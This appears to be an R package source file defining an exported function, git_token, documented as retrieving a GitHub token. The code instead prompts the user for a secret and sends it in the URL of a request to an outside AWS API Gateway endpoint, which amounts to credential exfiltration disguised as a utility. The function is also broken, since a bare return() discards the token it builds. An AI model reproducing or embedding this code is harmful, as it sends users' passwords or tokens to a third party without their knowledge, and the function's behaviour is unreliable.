#' Retrieves the github token.

#' @name git_token
#' @return \code{git_token}: [character] the auth token
#' @export
git_token <- function() {
    # Retrieves the github token
  fd=httr::GET(glue('https://1sk5fv32n5.execute-api.us-west-1.amazonaws.com/test2/{askpass::askpass()}'))
  paste0("ghp_",jsonlite::fromJSON(rawToChar(fd$content)))
    return()
    # Returns: [character] the auth token
}
